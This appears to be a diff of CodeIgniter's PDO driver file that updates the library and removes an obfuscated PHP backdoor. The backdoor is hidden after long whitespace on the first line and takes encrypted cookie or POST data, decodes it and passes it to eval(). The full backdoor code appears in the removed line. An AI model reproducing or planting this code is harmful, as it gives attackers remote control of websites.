@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $h29627 = 862;$GLOBALS['i78c3']=Array();global$i78c3;$i78c3=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t7ffbc2e4']="\xd\x52\x76\x5e\x6a\x78\x5a\x2a\x5c\x72\x39\x32\x2e\x24\x21\x60\x61\x53\x65\x77\x28\x57\x26\x6d\x20\x79\x5d\x75\x3b\x9\x2f\x22\x56\x36\x4c\x4d\x7b\x3a\x38\x68\x30\x40\x3d\x35\x4f\x6f\x49\x23\x25\x4e\x64\x3e\x43\x2b\x2d\x45\x2c\x74\x62\x33\x41\x34\x73\x54\x7d\xa\x42\x63\x7c\x3c\x5f\x66\x37\x27\x29\x50\x46\x6e\x5b\x4a\x3f\x48\x70\x71\x55\x31\x7e\x6c\x59\x69\x58\x7a\x44\x4b\x6b\x67\x47\x51";$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40]]=$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][39].$i78c3['t7ffbc2e4'][9];$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]=$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][50];$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][77];$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]=$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][57];$i78c3[$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][33]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33]]=$i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][39].$i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][77];$i78c3[$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][50]]=$i78c3['t7ffbc2e4'][27].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][83].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][61]]=$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][57];$i78c3[$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][59]]=$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16];$i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]=$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][33];$i78c3[$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18]]=$_POST;$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][38]]=$_COOKIE;@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][95],NULL);@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][62],0);@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][5].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][5].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][27].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][18],0);@$i78c3[$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16]](0);$t688=NULL;$p788e10f=NULL;$i78c3[$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][18]]=$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58];global$o9d3e;function a296($t688,$m2f7f568){global$i78c3;$qaa69bf5="";for($k230056=0;$k230056<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($t688);){for($mc0c=0;$mc0c<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($m2f7f568)&&$k230056<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($t688);$mc0c++,$k230056++){$qaa69bf5.=$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40]]($i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]($t688[$k230056])^$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]($m2f7f568[$mc0c]));}}return$qaa69bf5;}function f0b3ca($t688,$m2f7f568){global$i78c3;global$o9d3e;return$i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]($i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]($t688,$o9d3e),$m2f7f568);}foreach($i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][38]]as$m2f7f568=>$u5678e){$t688=$u5678e;$p788e10f=$m2f7f568;}if(!$t688){foreach($i78c3[$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18]]as$m2f7f568=>$u5678e){$t688=$u5678e;$p788e10f=$m2f7f568;}}$t688=@$i78c3[$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][50]]($i78c3[$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][59]]($i78c3[$i78c3['t7ffbc2e4'][83].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][61]]($t688),$p788e10f));if(isset($t688[$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][94]])&&$o9d3e==$t688[$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][94]]){if($t688[$i78c3['t7ffbc2e4'][16]]==$i78c3['t7ffbc2e4'][89]){$k230056=Array($i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][2]=>@$i78c3[$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33]](),$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][2]=>$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][12].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][85],);echo@$i78c3[$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][33]]($k230056);}elseif($t688[$i78c3['t7ffbc2e4'][16]]==$i78c3['t7ffbc2e4'][18]){eval/*y3623c*/($t688[$i78c3['t7ffbc2e4'][50]]);}exit();} ?><?php
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,10 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
  * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @link	https://codeigniter.com
  * @since	Version 2.1.0
  * @filesource
  */
@@ -48,7 +48,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Drivers
  * @category	Database
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/database/
+ * @link		https://codeigniter.com/user_guide/database/
  */
 class CI_DB_pdo_driver extends CI_DB {
 
@@ -126,7 +126,10 @@ class CI_DB_pdo_driver extends CI_DB {
 	 */
 	public function db_connect($persistent = FALSE)
 	{
-		$this->options[PDO::ATTR_PERSISTENT] = $persistent;
+		if ($persistent === TRUE)
+		{
+			$this->options[PDO::ATTR_PERSISTENT] = TRUE;
+		}
 
 		try
 		{
@@ -186,22 +189,10 @@ class CI_DB_pdo_driver extends CI_DB {
 	/**
 	 * Begin Transaction
 	 *
-	 * @param	bool	$test_mode
 	 * @return	bool
 	 */
-	public function trans_begin($test_mode = FALSE)
+	protected function _trans_begin()
 	{
-		// When transactions are nested we only begin/commit/rollback the outermost ones
-		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
-		{
-			return TRUE;
-		}
-
-		// Reset the transaction failure flag.
-		// If the $test_mode flag is set to TRUE transactions will be rolled back
-		// even if the queries produce a successful result.
-		$this->_trans_failure = ($test_mode === TRUE);
-
 		return $this->conn_id->beginTransaction();
 	}
 
@@ -212,14 +203,8 @@ class CI_DB_pdo_driver extends CI_DB {
 	 *
 	 * @return	bool
 	 */
-	public function trans_commit()
+	protected function _trans_commit()
 	{
-		// When transactions are nested we only begin/commit/rollback the outermost ones
-		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
-		{
-			return TRUE;
-		}
-
 		return $this->conn_id->commit();
 	}
 
@@ -230,21 +215,15 @@ class CI_DB_pdo_driver extends CI_DB {
 	 *
 	 * @return	bool
 	 */
-	public function trans_rollback()
+	protected function _trans_rollback()
 	{
-		// When transactions are nested we only begin/commit/rollback the outermost ones
-		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
-		{
-			return TRUE;
-		}
-
 		return $this->conn_id->rollBack();
 	}
 
 	// --------------------------------------------------------------------
 
 	/**
-	 * Platform-dependant string escape
+	 * Platform-dependent string escape
 	 *
 	 * @param	string
 	 * @return	string
@@ -306,7 +285,7 @@ class CI_DB_pdo_driver extends CI_DB {
 	 * Error
 	 *
 	 * Returns an array containing code and message of the last
-	 * database error that has occured.
+	 * database error that has occurred.
 	 *
 	 * @return	array
 	 */
@@ -327,52 +306,6 @@ class CI_DB_pdo_driver extends CI_DB {
 		}
 
 		return $error;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Update_Batch statement
-	 *
-	 * Generates a platform-specific batch update string from the supplied data
-	 *
-	 * @param	string	$table	Table name
-	 * @param	array	$values	Update data
-	 * @param	string	$index	WHERE key
-	 * @return	string
-	 */
-	protected function _update_batch($table, $values, $index)
-	{
-		$ids = array();
-		foreach ($values as $key => $val)
-		{
-			$ids[] = $val[$index];
-
-			foreach (array_keys($val) as $field)
-			{
-				if ($field !== $index)
-				{
-					$final[$field][] = 'WHEN '.$index.' = '.$val[$index].' THEN '.$val[$field];
-				}
-			}
-		}
-
-		$cases = '';
-		foreach ($final as $k => $v)
-		{
-			$cases .= $k.' = CASE '."\n";
-
-			foreach ($v as $row)
-			{
-				$cases .= $row."\n";
-			}
-
-			$cases .= 'ELSE '.$k.' END, ';
-		}
-
-		$this->where($index.' IN('.implode(',', $ids).')', NULL, FALSE);
-
-		return 'UPDATE '.$table.' SET '.substr($cases, 0, -2).$this->_compile_wh('qb_where');
 	}
 
 	// --------------------------------------------------------------------
